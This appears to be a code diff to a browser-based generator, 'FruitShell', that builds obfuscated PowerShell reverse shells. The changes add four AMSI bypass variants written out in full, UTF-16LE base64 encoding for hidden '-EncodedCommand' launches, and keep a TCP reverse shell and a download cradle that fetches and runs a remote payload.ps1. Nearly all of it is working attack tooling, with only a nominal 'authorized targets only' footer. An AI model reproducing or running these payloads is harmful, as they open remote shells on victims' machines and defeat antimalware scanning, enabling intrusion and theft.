@@ -17,7 +17,7 @@
             color: #e2e9ff;
         }
         .shell-card {
-            max-width: 1100px;
+            max-width: 1150px;
             width: 100%;
             background: rgba(18, 25, 45, 0.94);
             backdrop-filter: blur(14px);
@@ -55,8 +55,8 @@
         }
         .input-panel { padding: 2.2rem 2.2rem 1.8rem; background: #0f1622; }
         .field-group { display: flex; flex-wrap: wrap; gap: 1.6rem; margin-bottom: 1.6rem; }
-        .input-field { flex: 1; min-width: 220px; }
-        .input-field label {
+        .input-field, .select-field { flex: 1; min-width: 220px; }
+        .input-field label, .select-field label {
             display: block;
             font-size: 0.82rem;
             text-transform: uppercase;
@@ -64,7 +64,7 @@
             color: #c0cfef;
             margin-bottom: 0.6rem;
         }
-        .input-field input {
+        .input-field input, .select-field select {
             width: 100%;
             background: #010a1a;
             border: 2px solid #2a374b;
@@ -73,7 +73,7 @@
             font-size: 1.12rem;
             color: #f0f3ff;
         }
-        .input-field input:focus { border-color: #f7b32b; box-shadow: 0 0 0 4px rgba(247,179,43,0.3); }
+        .select-field select { font-family: inherit; }
         .controls {
             display: flex;
             flex-wrap: wrap;
@@ -125,7 +125,7 @@
             <span>🍒🍊🍉🍍🥝🍓</span>
             <h1>FruitShell · Ultimate Stealth</h1>
         </div>
-        <div class="fruit-tag">🍇 AMSI + Reversal + Token Chaos + Compression 🥭</div>
+        <div class="fruit-tag">🍇 AMSI Variants + UTF-16LE + Reversal 🥭</div>
     </div>
 
     <div class="input-panel">
@@ -140,6 +140,18 @@
             </div>
         </div>
 
+        <div class="field-group">
+            <div class="select-field">
+                <label>AMSI Bypass Variant</label>
+                <select id="amsiVariant">
+                    <option value="0">Classic Concat (A + msiUtils)</option>
+                    <option value="1" selected>Double Split (Heavy Fruit Style)</option>
+                    <option value="2">Reflected + Random Case</option>
+                    <option value="3">Minimal InitFailed Only</option>
+                </select>
+            </div>
+        </div>
+
         <div class="controls">
             <div style="display:flex; align-items:center; gap:10px;">
                 <label>Stealth Level:</label>
@@ -148,8 +160,9 @@
             </div>
             <label><input type="checkbox" id="ultraMode" checked> Extra Fruit Chaos</label>
             <label><input type="checkbox" id="compressMode"> Compress + EncodedCommand</label>
+            <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE Encoding</label>
             <label><input type="checkbox" id="cradleMode"> Use Download Cradle</label>
-            <label><input type="checkbox" id="oneLinerMode"> Force One-Liner Output</label>
+            <label><input type="checkbox" id="oneLinerMode"> Force One-Liner</label>
         </div>
 
         <div style="display:flex; gap:1rem; flex-wrap:wrap;">
@@ -169,12 +182,12 @@
             <span id="statusHint" class="status">ready</span>
         </div>
         <div id="shell-script" class="pre-wrap">
-# Click Generate to create a heavily obfuscated fruit-powered reverse shell
+# Select AMSI variant and click Generate
         </div>
     </div>
 
     <footer>
-        🍌 Random fruit vars • AMSI bypass • String reversal • Case randomization • Pure client-side • Authorized use only
+        🍌 Multiple AMSI bypass variants • Fruit obfuscation • UTF-16LE • String reversal • Use responsibly on authorized targets only
     </footer>
 </div>
 
@@ -211,21 +224,44 @@
         return s.split('').reverse().join('');
     }
 
-    function generateUltimateFruitShell(ip, portStr, stealthLevel, ultra, compress, cradle, oneLiner) {
+    function getAmsiBypass(variant, stealthLevel) {
         const used = new Set();
         const f = () => getRandomFruit(used);
 
-        // Improved AMSI bypass with more concatenation
-        const amsi = `
-$a='System.Management.Automation.A';$b='msiUtils';
-$c=[Ref].Assembly.GetType($a+$b);
-$d=$c.GetField('amsiInitFailed','NonPublic,Static');
-$d.SetValue($null,$true);`.trim();
+        if (variant === "0") { // Classic Concat
+            return `$a='System.Management.Automation.A';$b='msiUtils';\n$c=[Ref].Assembly.GetType($a+$b);\n$d=$c.GetField('amsiInitFailed','NonPublic,Static');\n$d.SetValue($null,$true);`;
+        }
+        if (variant === "1") { // Double Split (heavier fruit style)
+            let a1 = obfuscateString('System.Management.Automation.', stealthLevel);
+            let a2 = obfuscateString('AmsiUtils', stealthLevel);
+            return `${a1}$b=${a2};\n$c=[Ref].Assembly.GetType($a+$b);\n$d=$c.GetField('amsiInitFailed','NonPublic,Static');\n$d.SetValue($null,$true);`;
+        }
+        if (variant === "2") { // Reflected + Random Case
+            return `$${f()}=[Ref].Assembly.GetType('${randomCase('System.Management.Automation.AmsiUtils')}');\n$${f()}=$${f()}.GetField('${randomCase('amsiInitFailed')}','NonPublic,Static');\n$${f()}.SetValue($null,$true);`;
+        }
+        if (variant === "3") { // Minimal
+            return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);`;
+        }
+        return '';
+    }
+
+    function toUtf16LEBase64(str) {
+        let utf16le = '';
+        for (let i = 0; i < str.length; i++) {
+            utf16le += str.charCodeAt(i) + '\0';
+        }
+        return btoa(utf16le);
+    }
+
+    function generateUltimateFruitShell(ip, portStr, stealthLevel, ultra, compress, utf16, cradle, oneLiner, amsiVariant) {
+        const used = new Set();
+        const f = () => getRandomFruit(used);
+
+        const amsiBypass = getAmsiBypass(amsiVariant, stealthLevel);
 
         const client = f(); const stream = f(); const writer = f();
         const buffer = f(); const data = f(); const raw = f();
 
-        // IP splitting
         let ipAssignments = '';
         let ipExprParts = [];
         ip.split('').forEach(char => {
@@ -235,16 +271,13 @@ $d.SetValue($null,$true);`.trim();
         });
         const ipExpr = ipExprParts.join('+');
 
-        // Port
         let portExpr = `'${portStr}'`;
-        if (stealthLevel >= 3) {
-            portExpr = portStr.split('').map(c => `'${c}'`).join(' + ');
-        }
+        if (stealthLevel >= 3) portExpr = portStr.split('').map(c => `'${c}'`).join(' + ');
 
-        // Core with reversal for iex
         let iexReversed = reverseString('xei');
+
         let core = `
-${amsi}
+${amsiBypass}
 $ErrorActionPreference = 'SilentlyContinue';
 ${ipAssignments}
 $${client} = New-Object (${obfuscateString('System.Net.Sockets.TCPClient', stealthLevel)})(${ipExpr}, ${portExpr});
@@ -258,35 +291,28 @@ while (($${data} = $${stream}.Read($${buffer}, 0, $${buffer}.Length)) -ne 0) {
 }
 $${client}.Close();`.trim();
 
-        if (ultra) {
-            // Add random case to some parts
-            core = core.replace(/New-Object/g, randomCase('New-Object'));
-        }
-
-        if (cradle) {
-            core = `IEX((New-Object Net.WebClient).DownloadString('http://${ip}:${portStr}/payload.ps1'));\n` + core;
-        }
+        if (ultra) core = core.replace(/New-Object/g, randomCase('New-Object'));
+        if (cradle) core = `IEX((New-Object Net.WebClient).DownloadString('http://${ip}:${portStr}/payload.ps1'));\n` + core;
 
         if (compress) {
-            const b64 = btoa(unescape(encodeURIComponent(core)));
-            return `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${b64}`;
+            const encoded = utf16 ? toUtf16LEBase64(core) : btoa(unescape(encodeURIComponent(core)));
+            return `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
         }
 
-        if (oneLiner) {
-            // Basic one-liner conversion (remove newlines, reduce whitespace)
-            core = core.replace(/\s+/g, ' ').trim();
-        }
+        if (oneLiner) core = core.replace(/\s+/g, ' ').trim();
 
         return core;
     }
 
-    // DOM setup (same as previous with added oneLinerMode)
+    // DOM
     const ipInput = document.getElementById('ip');
     const portInput = document.getElementById('port');
     const stealthSlider = document.getElementById('stealthLevel');
     const levelDisplay = document.getElementById('levelDisplay');
+    const amsiSelect = document.getElementById('amsiVariant');
     const ultraChk = document.getElementById('ultraMode');
     const compressChk = document.getElementById('compressMode');
+    const utf16Chk = document.getElementById('utf16Mode');
     const cradleChk = document.getElementById('cradleMode');
     const oneLinerChk = document.getElementById('oneLinerMode');
     const genBtn = document.getElementById('generateBtn');
@@ -306,14 +332,11 @@ $${client}.Close();`.trim();
     function handleGenerate() {
         const ip = ipInput.value.trim();
         const portStr = portInput.value.trim();
+        const amsiVariant = amsiSelect.value;
 
-        if (!ip) {
-            outputArea.textContent = '⚠️ Please enter Listener IP / hostname';
-            statusHint.textContent = 'missing ip';
-            return;
-        }
+        if (!ip) return outputArea.textContent = '⚠️ Enter IP/hostname', statusHint.textContent = 'missing ip';
         if (!portStr || isNaN(parseInt(portStr)) || parseInt(portStr) < 1 || parseInt(portStr) > 65535) {
-            outputArea.textContent = '⚠️ Port must be a number 1–65535';
+            outputArea.textContent = '⚠️ Port must be 1–65535';
             statusHint.textContent = 'invalid port';
             return;
         }
@@ -324,19 +347,19 @@ $${client}.Close();`.trim();
                 parseInt(stealthSlider.value),
                 ultraChk.checked,
                 compressChk.checked,
+                utf16Chk.checked,
                 cradleChk.checked,
-                oneLinerChk.checked
+                oneLinerChk.checked,
+                amsiVariant
             );
 
             outputArea.textContent = payload;
             outputArea.classList.add('flash');
             setTimeout(() => outputArea.classList.remove('flash'), 1000);
 
-            copyBtn.disabled = false;
-            copyEncodedBtn.disabled = false;
-            copyFullBtn.disabled = false;
-            statusHint.textContent = '🍍 ultimate fruit shell ready!';
-            setTimeout(() => statusHint.textContent = 'ready', 2500);
+            copyBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = false;
+            statusHint.textContent = '🍍 fruit shell with selected AMSI variant ready!';
+            setTimeout(() => statusHint.textContent = 'ready', 2800);
         } catch (e) {
             outputArea.textContent = `Error: ${e.message}`;
             statusHint.textContent = 'error';
@@ -354,7 +377,7 @@ $${client}.Close();`.trim();
     genBtn.addEventListener('click', handleGenerate);
     copyBtn.addEventListener('click', () => copyToClipboard(outputArea.textContent, copyBtn));
     copyEncodedBtn.addEventListener('click', () => {
-        const encoded = generateUltimateFruitShell(ipInput.value.trim(), portInput.value.trim(), parseInt(stealthSlider.value), ultraChk.checked, true, cradleChk.checked, oneLinerChk.checked);
+        const encoded = generateUltimateFruitShell(ipInput.value.trim(), portInput.value.trim(), parseInt(stealthSlider.value), ultraChk.checked, true, utf16Chk.checked, cradleChk.checked, oneLinerChk.checked, amsiSelect.value);
         copyToClipboard(encoded, copyEncodedBtn, '✅ EncodedCommand Copied!');
     });
     copyFullBtn.addEventListener('click', () => {
@@ -364,7 +387,7 @@ $${client}.Close();`.trim();
 
     clearBtn.addEventListener('click', () => {
         ipInput.value = ''; portInput.value = '';
-        outputArea.textContent = '# Ready for another fresh stealth fruit shell... 🍍';
+        outputArea.textContent = '# Select AMSI variant and generate... 🍍';
         copyBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = true;
         statusHint.textContent = 'cleared';
         setTimeout(() => statusHint.textContent = 'ready', 1200);
